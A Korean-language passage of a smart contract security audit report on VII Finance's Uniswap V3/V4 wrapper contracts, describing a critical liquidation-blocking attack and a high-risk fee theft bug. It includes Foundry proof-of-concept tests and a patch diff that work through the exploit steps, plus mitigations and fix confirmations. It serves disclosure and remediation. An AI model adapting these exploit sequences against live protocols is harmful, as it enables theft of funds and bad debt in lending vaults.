**수석 감사자**

[Giovanni Di Siena](https://x.com/giovannidisiena)

[Stalin](https://x.com/0xstalin)

**보조 감사자**



---

# 발견 사항 (Findings)
## 치명적 위험 (Critical Risk)


### 공격자가 다양한 수단을 통해 청산을 되돌려(revert) 청산인에게 손실을 입히고 볼트에 악성 부채를 발생시킬 수 있음

**설명:** 두 개의 악의적인 계정 간의 공모와 별도로 문서화된 다양한 공격 벡터를 결합하여, 공격자가 청산인이 받을 자격이 있는 기초 담보를 회수할 수 없게 만듦으로써 청산 의욕을 꺾거나 청산 가능한 포지션을 언와인딩(unwind)하지 못하게 하는 시나리오를 설계할 수 있습니다.

이 공격을 가능하게 하는 문제들을 요약하면 다음과 같습니다:
* 수수료 탈취로 인해 이미 부분적으로 언랩된 포지션에 대한 부분 언랩이 되돌려집니다. 부분 청산이 실행되고 청산인이 부분 언랩을 수행하여 기초 담보를 회수할 것으로 예상되지만, 래퍼 컨트랙트가 비례 이체를 처리할 충분한 잔고를 보유하고 있지 않다면 이것이 불가능합니다.
* 부정확한 회계 처리로 인해 이전에 부분적으로 언랩된 포지션에 대한 이체 금액이 부풀려집니다. 이는 위반자가 이체를 완료하기에 충분한 ERC-6909를 보유하지 않게 되어 청산이 되돌려지게 할 수 있습니다.
* 전송자가 ERC-6909 잔고를 가지고 있지 않은 담보를 활성화하는 것도 위반자가 볼트 자산을 대출받는 데 사용한 다른 담보 자산의 성공적인 이체를 차단하는 데 유사하게 활용될 수 있습니다.

다음 시나리오를 고려해 보십시오:
* Alice와 Bob은 동일한 악의적인 사용자에 의해 제어됩니다.
* Alice는 `tokenId1`으로 표시되는 포지션을 소유하고 Bob은 `tokenId2`로 표시되는 포지션을 소유합니다.
* `tokenId1`과 `tokenId2` 포지션 모두 일부 수수료가 누적됩니다.
* Alice는 `tokenId1`의 작은 부분을 Bob에게 이체합니다.
* Bob은 `tokenId1`의 작은 부분에 대해 부분 언랩을 수행합니다.
* `tokenId1`과 `tokenId2` 포지션 모두 더 많은 수수료가 누적됩니다.
* Alice는 최대 부채를 대출받고 곧 포지션이 청산 가능해집니다.
* Bob은 `tokenId2`의 전체 언랩을 통한 부분 언랩(수수료 탈취 공격)으로 `tokenId1`의 부분 청산을 프론트런(front-run)합니다.
* 부분 청산이 성공하여 `tokenId1`의 일부가 청산인에게 이체됩니다.
* 청산인은 `tokenId1`을 부분 언랩하여 수수료가 포함된 기초 원금 담보를 회수하려고 하지만 되돌려집니다.
* 이는 별도의 트랜잭션으로 실행될 경우 청산인에게 손실을 입히거나, 원자적(atomically)으로 실행될 경우 부분 청산을 방지/억제합니다.
* 포지션은 완전히 청산 가능해질 때까지 담보 부족 상태가 계속됩니다.
* 청산 중 이체는 Alice의 잔고보다 더 큰 이체 금액을 계산하는 이체 인플레이션 문제로 인해 되돌려집니다.
* Alice의 포지션은 담보가 부족해지고 볼트에 악성 부채가 발생합니다.
* 참고: 이체 문제가 없더라도 Alice의 전체 `tokenId1` 잔고가 청산인에게 이체되지만, 청산인이 전체 ERC-6909 공급량(Bob이 여전히 작은 부분을 보유)을 소유하지 않으므로 전체 언랩으로도 기초 담보를 회수하는 것은 불가능합니다.

아래에서 입증된 바와 같이, 이 복잡한 일련의 단계는 청산을 성공적으로 차단할 수 있습니다. 위반자는 한 포지션을 부분적으로 언랩하고, 다른 포지션으로 남은 수수료를 탈취하여 래퍼 컨트랙트에 부분적으로 언랩된 포지션의 남은 보류 수수료에 대한 충분한 통화 잔고가 없게 만들 수 있습니다. 부분 청산이 발생할 때, 청산인이 전체 포지션의 작은 부분을 언랩하더라도 잔고에 수수료가 없어 청산이 되돌려지게 됩니다. 이 설정은 실제로 수수료 탈취에 의존하지 않고 전송자가 ERC-6909 잔고가 없는 담보를 활성화하여 부채를 뒷받침하는 다른 담보 자산의 성공적인 이체를 차단함으로써 훨씬 간단하게 축소될 수 있습니다.

**영향:** 공격자는 자신의 포지션이 청산되는 것을 높은 확률로 방지하는 DoS를 의도적으로 유발할 수 있습니다. 이는 악성 부채가 발생하는 볼트에 심각한 영향을 미칩니다.

**PoC (Proof of Concept):** `increasePosition()`을 정의하는 별도 이슈에 제공된 diff를 참조하여 `forge test --mt test_blockLiquidationsPoC -vvv`로 다음 테스트를 실행하십시오:

* 첫 번째 PoC는 소유하지 않은 담보 활성화 및 이체 오산을 사용합니다:

```solidity
function test_blockLiquidationsPoC_enableCollateral() public {
    address attacker = makeAddr("attacker");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);

    // 2. attacker wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, attacker);

    // 3. attacker enables both tokenId1 and tokenId2 as collateral
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // 4. attacker max borrows from vault
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 5. simulate attacker becoming liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));

    // @audit-issue => liquidator attempts to liquidate attacker
    // @audit-issue => but transfer reverts due to insufficient ERC-6909 balance of tokenId1
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            attacker,
            wrapper.balanceOf(liquidator, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);
}
```

* 두 번째 PoC는 수수료 탈취 및 이체 오산을 사용합니다:

```solidity
function test_blockLiquidationsPoC_transferInflation() public {
    address attacker = makeAddr("attacker");
    address accomplice = makeAddr("accomplice");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. attacker wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, attacker);

    // 2. accomplice wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);

    // 3. swap so that some fees are generated
    swapExactInput(borrower, address(token0), address(token1), 100_000 * unit0);

    // 4. attacker enables tokenId1 as collateral and transfers a small portion to accomplice
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.transfer(accomplice, wrapper.balanceOf(attacker) / 100);

    // 5. accomplice enables tokenId2 as collateral and partially unwraps
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId1,
        accomplice,
        wrapper.balanceOf(accomplice, tokenId1) / 2,
        bytes("")
    );

    // 6. attacker borrows max debt from eVault
    startHoax(attacker);
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 7. simulate attacker becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    // 8. accomplice executes fee theft against attacker
    startHoax(accomplice);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );
    wrapper.unwrap(
        accomplice,
        tokenId2,
        borrower
    );
    startHoax(borrower);
    wrapper.underlying().approve(address(mintPositionHelper), tokenId2);
    increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, borrower);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT() * 99 / 100,
        bytes("")
    );

    // 9. liquidator attempts to liquidate attacker
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);

    // full liquidation reverts due to transfer inflation issue
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            attacker,
            wrapper.balanceOf(attacker, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);

    // 10. at most 1% of the partially liquidated position can be unwrapped
    eVault.liquidate(attacker, address(wrapper), maxRepay / 10, 0);
    uint256 partialBalance = wrapper.balanceOf(liquidator, tokenId1) / 10;

    vm.expectRevert(
        abi.encodeWithSelector(
            CustomRevert.WrappedError.selector,
            liquidator,
            bytes4(0),
            bytes(""),
            abi.encodePacked(bytes4(keccak256("NativeTransferFailed()")))
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator,
        partialBalance,
        bytes("")
    );
}
```

* 세 번째 PoC는 이체 문제가 수정된 후에도 수수료 탈취를 사용하여 청산인에게 손실을 입히는 것이 여전히 가능함을 보여줍니다 (권장되는 완화 diff를 적용하여 이 테스트가 통과하는지 확인하십시오):

```solidity
function test_blockLiquidationsPoC_feeTheft() public {
    address attacker = makeAddr("attacker");
    address accomplice = makeAddr("accomplice");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. attacker wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, attacker);

    // 2. accomplice wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);

    // 3. swap so that some fees are generated
    swapExactInput(borrower, address(token0), address(token1), 100_000 * unit0);

    // 4. attacker enables tokenId1 as collateral and transfers a small portion to accomplice
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.transfer(accomplice, wrapper.balanceOf(attacker) / 100);

    // 5. accomplice enables tokenId2 as collateral and partially unwraps
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId1,
        accomplice,
        wrapper.balanceOf(accomplice, tokenId1) / 2,
        bytes("")
    );

    // 6. attacker borrows max debt from eVault
    startHoax(attacker);
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 7. simulate attacker becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    // 8. accomplice executes fee theft against attacker
    startHoax(accomplice);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );
    wrapper.unwrap(
        accomplice,
        tokenId2,
        borrower
    );
    startHoax(borrower);
    wrapper.underlying().approve(address(mintPositionHelper), tokenId2);
    increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, borrower);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT() * 99 / 100,
        bytes("")
    );

    // 9. liquidator fully liquidates attacker
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);

    // 10. liquidator repays the debt
    deal(token1, liquidator, 1_000_000_000 * unit1);
    IERC20(token1).approve(address(eVault), type(uint256).max);
    eVault.repay(type(uint256).max, liquidator);
    evc.disableCollateral(liquidator, address(wrapper));
    eVault.disableController();

    // 11. attempting to unwrap even 1% of the position fails
    uint256 balanceToUnwrap = wrapper.balanceOf(liquidator, tokenId1) / 100;

    vm.expectRevert(
        abi.encodeWithSelector(
            CustomRevert.WrappedError.selector,
            liquidator,
            bytes4(0),
            bytes(""),
            abi.encodePacked(bytes4(keccak256("NativeTransferFailed()")))
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator,
        balanceToUnwrap,
        bytes("")
    );

    // 12. full unwrap is blocked by accomplice's non-zero balance
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            liquidator,
            wrapper.balanceOf(liquidator, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator
    );
}
```

**권장되는 완화 방법:** 이 문제를 완화하기 위해 다른 모든 문제에 대한 권장 사항을 적용해야 합니다:
* 해당 수수료가 징수되면 주어진 ERC-6909 `tokenId`에 대한 `tokensOwed` 상태를 감소시킵니다.
* `normalizedToFull()` 계산을 수행할 때 위반자의 `tokenId` 잔고만 고려합니다.
* 전송자가 `tokenId`에 대한 ERC-6909 잔고를 보유하지 않은 경우 담보 활성화를 방지하는 것을 고려하십시오.

**VII Finance:** 커밋 [8c6b6cc](https://github.com/kankodu/vii-finance-smart-contracts/commit/8c6b6cca4ed65b22053dc7ffaa0b77d06a160caf) 및 [b7549f2](https://github.com/kankodu/vii-finance-smart-contracts/commit/b7549f2700af133ce98a4d6f19e43c857b5ea78a)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다. 수수료 탈취 및 부풀려진 ERC-6909 이체는 더 이상 유효한 공격 벡터가 아닙니다. ERC-6909 잔고 없이 담보를 활성화하는 것은 여전히 가능하지만, 다른 완화 조치가 적용된 상태에서 이는 다음 Halmos 테스트에 의해 공식적으로 검증된 바와 같이 단순히 0값 이체를 초래합니다:

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.26;

import {Math} from "lib/openzeppelin-contracts/contracts/utils/math/Math.sol";
import {Test} from "forge-std/Test.sol";

contract MathTest is Test {
    // halmos --function test_mulDivPoC
    function test_mulDivPoC(uint256 amount, uint256 value) public {
        vm.assume(value != 0);
        assertEq(Math.mulDiv(amount, 0, value, Math.Rounding.Ceil), 0);
    }
}
```

\clearpage
## 고위험 (High Risk)


### 부분적으로 언랩된 `UniswapV4Wrapper` 포지션에서 수수료가 탈취될 수 있음

**설명:** `ERC721WrapperBase`는 주어진 `tokenId`에 대한 ERC-6909 포지션의 전체 및 부분 언랩을 수행하기 위해 `unwrap()` 함수의 두 가지 오버로드를 노출합니다:

```solidity
function unwrap(address from, uint256 tokenId, address to) external callThroughEVC {
    _burnFrom(from, tokenId, totalSupply(tokenId));
    underlying.transferFrom(address(this), to, tokenId);
}

function unwrap(address from, uint256 tokenId, address to, uint256 amount, bytes calldata extraData)
    external
    callThroughEVC
{
    _unwrap(to, tokenId, amount, extraData);
    _burnFrom(from, tokenId, amount);
}
```

전체 언랩은 호출자가 전체 ERC-6909 토큰 공급량을 소유하고 있다고 가정하고, 이 토큰들을 소각한 후 기초 Uniswap 포지션을 이체합니다. 반면, 부분 언랩은 호출자로부터 지정된 양의 ERC-6909 토큰을 소각하는 데 사용되며, 가상의 `_unwrap()` 함수를 통해 모든 ERC-6909 보유자 간에 LP 수수료의 비례 배분을 처리합니다.

Uniswap V3에서 LP 수수료 잔고는 기초 원금 금액과 별도로 회계 처리되어, 유동성이 수정될 때 풀이 즉시 사용자에게 발생한 수수료를 보내지 않고 대신 포지션의 `tokensOwed` 잔고를 증가시킵니다. `UniswapV3Wrapper::_unwrap`은 `NonFungiblePositionManager` 계약이 관리하는 owed 토큰 회계를 기반으로 주어진 ERC-6909 보유자에게 빚진 비율을 계산하며, 이를 통해 `collect()` 호출에 정확한 금액을 전달할 수 있습니다:

```solidity
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal override {
    (,,,,,,, uint128 liquidity,,,,) = INonfungiblePositionManager(address(underlying)).positions(tokenId);

    (uint256 amount0, uint256 amount1) =
        _decreaseLiquidity(tokenId, proportionalShare(tokenId, uint256(liquidity), amount).toUint128(), extraData);

    (,,,,,,,,,, uint256 tokensOwed0, uint256 tokensOwed1) =
        INonfungiblePositionManager(address(underlying)).positions(tokenId);

    //amount0 and amount1 is the part of the liquidity
    //token0Owed - amount0 and token1Owed - amount1 are the total fees (the principal is always collected in the same tx). part of the fees needs to be sent to the recipient as well

    INonfungiblePositionManager(address(underlying)).collect(
        INonfungiblePositionManager.CollectParams({
            tokenId: tokenId,
            recipient: to,
            amount0Max: (amount0 + proportionalShare(tokenId, (tokensOwed0 - amount0), amount)).toUint128(),
            amount1Max: (amount1 + proportionalShare(tokenId, (tokensOwed1 - amount1), amount)).toUint128()
        })
    );
}
```

이와 대조적으로, Uniswap V4에서 유동성 수정 시 `PoolManager`는 획득한 LP 수수료의 전체 잔고를 사용자에게 직접 이체하며, 델타가 동일한 트랜잭션 내에서 정산될 것을 요구합니다. 기초 Uniswap V4 포지션에 해당하는 ERC-6909 토큰은 여러 보유자를 가질 수 있으므로, 현재 자신의 몫을 언랩하는 소유자에게 이 모든 수수료를 전달하는 것은 부정확합니다. 따라서 `UniswapV4Wrapper::_unwrap`은 먼저 이러한 수수료를 `tokensOwed` 매핑을 사용하여 스토리지에 누적하고, 이 상태를 다른 ERC-6909 토큰 보유자의 후속 부분 언랩에 사용하여 해당 포지션과 상호 작용할 때 지정된 수령인에게 해당 토큰 잔고의 몫만 분배합니다:

```solidity
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal override {
    PositionState memory positionState = _getPositionState(tokenId);

    (uint256 pendingFees0, uint256 pendingFees1) = _pendingFees(positionState);
    _accumulateFees(tokenId, pendingFees0, pendingFees1);

    uint128 liquidityToRemove = proportionalShare(tokenId, positionState.liquidity, amount).toUint128();
    (uint256 amount0, uint256 amount1) = _principal(positionState, liquidityToRemove);

    _decreaseLiquidity(tokenId, liquidityToRemove, ActionConstants.MSG_SENDER, extraData);

    poolKey.currency0.transfer(to, amount0 + proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount));
    poolKey.currency1.transfer(to, amount1 + proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount));
}
```

즉, `UniswapV3Wrapper`와 달리 `UniswapV4Wrapper`는 이 `tokenId`의 모든 보유자가 언랩할 때까지 부분적으로 언랩된 ERC-6909 포지션에 대해 `currency0` 및 `currency1`의 0이 아닌 잔고를 보유해야 합니다. 또한 부분 언랩은 부분 청산 후에 사용하도록 의도되었지만, 이 오버로드를 사용하여 전체 언랩을 수행하는 것이 가능합니다. 비례 몫 계산이 실행되어 기초 원금 잔고와 LP 수수료를 유일한 보유자에게 이체하고, 별도의 이슈에 문서화된 대로 래퍼 컨트랙트에 빈 유동성 포지션을 남깁니다. ERC-6909 토큰의 총 공급량이 0으로 줄어들기 때문에, `_burnFrom()`은 되돌리기(revert) 없이 모든 전송자에 의해 호출될 수 있으며, 따라서 빈 Uniswap V4 포지션은 이후 전체 언랩을 호출하여 회수할 수 있습니다.

`tokensOwed` 상태가 절대 감소되지 않는다는 사실과 결합하여, 이 엣지 케이스는 이전에 부분적으로 언랩된 포지션을 반복적으로 랩핑하고 언랩핑함으로써 `UniswapV4Wrapper`의 내부 회계를 조작하는 데 사용될 수 있습니다. 다음 시나리오를 고려해 보십시오:

* Alice가 Uniswap V4 포지션을 랩핑합니다.
* 시간이 지나고 포지션에 수수료가 누적됩니다.
* Alice는 부분 언랩 오버로드를 사용하여 포지션을 완전히 언랩하여, 위에서 설명한 대로 유동성과 수수료를 0으로 줄입니다.
* 그런 다음 Alice는 전체 언랩을 통해 기초 포지션을 회수하고 유동성을 다시 증가시킵니다.
* Alice는 동일한 Uniswap V4 포지션을 다시 랩핑하고 다시 한 번 전체 해당 ERC-6909 잔고를 발행받습니다.
* 포지션을 완전히 언랩했음에도 불구하고, `tokensOwed` 매핑은 여전히 첫 번째 랩핑되었을 때 포지션에 누적된 수수료에 해당하는 0이 아닌 값을 스토리지에 포함하고 있습니다.
* Alice는 이제 이 상태를 재사용하여 `UniswapV4Wrapper`에서 토큰을 빼돌려, 부분적으로 언랩된 다른 포지션의 보유자를 위한 LP 수수료를 훔칠 수 있습니다.

요약하자면, 부분적으로 언랩된 포지션은 다른 보유자에게 빚진 비례 수수료가 래퍼에 저장되며, 이미 완전히 언랩된 포지션을 회수하고 다시 랩핑할 수 있는 기능과 연결하여, 오래된 `tokensOwned` 상태를 사용하여 부분적으로 언랩된 다른 포지션의 보유자로부터 청구되지 않은 수수료를 훔칠 수 있습니다. 아래 PoC에서 시연되고 별도의 발견 사항에서 자세히 설명된 바와 같이, 이는 부분 잔고를 완전히 언랩하려는 다른 보유자에게 DoS를 유발하여 청산에 영향을 미치고 볼트에 악성 부채가 발생하게 할 수 있습니다.

**영향:** 적어도 한 번 부분적으로 언랩된 포지션에 대해 ERC-6909 보유자로부터 수수료를 도난당할 수 있으며, 이는 높은 영향을 나타냅니다. 주어진 `tokenId`가 여러 보유자를 갖는 경우는 부분 청산의 경우에만 예상되며, 청산인이 유일한 소유자가 되는 전체 청산의 경우에는 문제가 발생하지 않습니다. 그러나 실제로 합법적인 사용자가 자신의 포지션을 부분적으로 언랩하는 것을 막을 수 있는 것은 없습니다. 예를 들어, 사용자가 여전히 미지불 대출을 뒷받침할 충분한 담보가 있는 대규모 포지션에서 유동성을 일부 회수하기 위해 부분적으로 언랩하여 LP 수수료 이체를 유발하고, 래퍼 컨트랙트에 회계 처리되어 중간/높은 가능성으로 공격을 가능하게 하는 것은 합리적인 가정입니다.

**PoC (Proof of Concept):** 다음 패치를 적용하고 `forge test --mt test_feeTheftPoC -vvv`를 실행하십시오:

```diff
---
 .../periphery/UniswapMintPositionHelper.sol   |  52 ++++++
 .../test/uniswap/UniswapV4Wrapper.t.sol       | 163 +++++++++++++++++-
 2 files changed, 214 insertions(+), 1 deletion(-)

diff --git a/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol b/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
index 8888549..68aedf9 100644
--- a/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
+++ b/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
@@ -124,5 +124,57 @@ contract UniswapMintPositionHelper is EVCUtil {
         positionManager.modifyLiquidities{value: address(this).balance}(abi.encode(actions, params), block.timestamp);
     }

+    function increaseLiquidity(
+        PoolKey calldata poolKey,
+        uint256 tokenId,
+        uint128 liquidityDelta,
+        uint256 amount0Max,
+        uint256 amount1Max,
+        address recipient
+    ) external payable {
+        Currency curr0 = poolKey.currency0;
+        Currency curr1 = poolKey.currency1;
+
+        if (amount0Max > 0) {
+            address t0 = Currency.unwrap(curr0);
+            if (!curr0.isAddressZero()) {
+                IERC20(t0).safeTransferFrom(msg.sender, address(this), amount0Max);
+            } else {
+                // native ETH case
+                require(msg.value >= amount0Max, "Insufficient ETH");
+                weth.deposit{value: amount0Max}();
+            }
+        }
+        if (amount1Max > 0) {
+            address t1 = Currency.unwrap(curr1);
+            IERC20(t1).safeTransferFrom(msg.sender, address(this), amount1Max);
+        }
+
+        if (!curr0.isAddressZero()) {
+            curr0.transfer(address(positionManager), amount0Max);
+        }
+
+        curr1.transfer(address(positionManager), amount1Max);
+
+        bytes memory actions = new bytes(5);
+        actions[0] = bytes1(uint8(Actions.INCREASE_LIQUIDITY));
+        actions[1] = bytes1(uint8(Actions.SETTLE));
+        actions[2] = bytes1(uint8(Actions.SETTLE));
+        actions[3] = bytes1(uint8(Actions.SWEEP));
+        actions[4] = bytes1(uint8(Actions.SWEEP));
+
+        bytes[] memory params = new bytes[](5);
+        params[0] = abi.encode(tokenId, liquidityDelta, amount0Max, amount1Max, bytes(""));
+        params[1] = abi.encode(curr0, ActionConstants.OPEN_DELTA, false);
+        params[2] = abi.encode(curr1, ActionConstants.OPEN_DELTA, false);
+        params[3] = abi.encode(curr0, recipient);
+        params[4] = abi.encode(curr1, recipient);
+
+        positionManager.modifyLiquidities{ value: address(this).balance }(
+            abi.encode(actions, params),
+            block.timestamp
+        );
+    }
+
     receive() external payable {}
 }
diff --git a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
index fa6c18b..2fce3ed 100644
--- a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
+++ b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
@@ -125,7 +125,7 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {

     TestRouter public router;

-    bool public constant TEST_NATIVE_ETH = true;
+    bool public constant TEST_NATIVE_ETH = false;

     function deployWrapper() internal override returns (ERC721WrapperBase) {
         currency0 = Currency.wrap(address(token0));
@@ -258,6 +258,36 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
         amount0 = token0BalanceBefore - targetPoolKey.currency0.balanceOf(owner);
         amount1 = token1BalanceBefore - targetPoolKey.currency1.balanceOf(owner);
     }
+
+    function increasePosition(
+        PoolKey memory targetPoolKey,
+        uint256 targetTokenId,
+        uint128 liquidity,
+        uint256 amount0Desired,
+        uint256 amount1Desired,
+        address owner
+    ) internal returns (uint256 amount0, uint256 amount1) {
+        deal(address(token0), owner, amount0Desired * 2 + 1);
+        deal(address(token1), owner, amount1Desired * 2 + 1);
+
+        uint256 token0BalanceBefore = targetPoolKey.currency0.balanceOf(owner);
+        uint256 token1BalanceBefore = targetPoolKey.currency1.balanceOf(owner);
+
+        mintPositionHelper.increaseLiquidity{value: targetPoolKey.currency0.isAddressZero() ? amount0Desired * 2 + 1 : 0}(
+            targetPoolKey, targetTokenId, liquidity, amount0Desired, amount1Desired, owner
+        );
+
+        //ensure any unused tokens are returned to the borrower and position manager balance is zero
+        // assertEq(targetPoolKey.currency0.balanceOf(address(positionManager)), 0);
+        assertEq(targetPoolKey.currency1.balanceOf(address(positionManager)), 0);
+
+        //for some reason, there is 1 wei of dust native eth left in the mintPositionHelper contract
+        // assertEq(targetPoolKey.currency0.balanceOf(address(mintPositionHelper)), 0);
+        assertEq(targetPoolKey.currency1.balanceOf(address(mintPositionHelper)), 0);
+
+        amount0 = token0BalanceBefore - targetPoolKey.currency0.balanceOf(owner);
+        amount1 = token1BalanceBefore - targetPoolKey.currency1.balanceOf(owner);
+    }

     function swapExactInput(address swapper, address tokenIn, address tokenOut, uint256 inputAmount)
         internal
@@ -313,6 +343,34 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
             borrower
         );
     }
+
+    function boundLiquidityParamsAndMint(LiquidityParams memory params, address _borrower)
+        internal
+        returns (uint256 tokenIdMinted, uint256 amount0Spent, uint256 amount1Spent)
+    {
+        params.liquidityDelta = bound(params.liquidityDelta, 10e18, 10_000e18);
+        (uint160 sqrtRatioX96,,,) = poolManager.getSlot0(poolId);
+        params = createFuzzyLiquidityParams(params, poolKey.tickSpacing, sqrtRatioX96);
+
+        (uint256 estimatedAmount0Required, uint256 estimatedAmount1Required) = LiquidityAmounts.getAmountsForLiquidity(
+            sqrtRatioX96,
+            TickMath.getSqrtPriceAtTick(params.tickLower),
+            TickMath.getSqrtPriceAtTick(params.tickUpper),
+            uint128(uint256(params.liquidityDelta))
+        );
+
+        startHoax(_borrower);
+
+        (tokenIdMinted, amount0Spent, amount1Spent) = mintPosition(
+            poolKey,
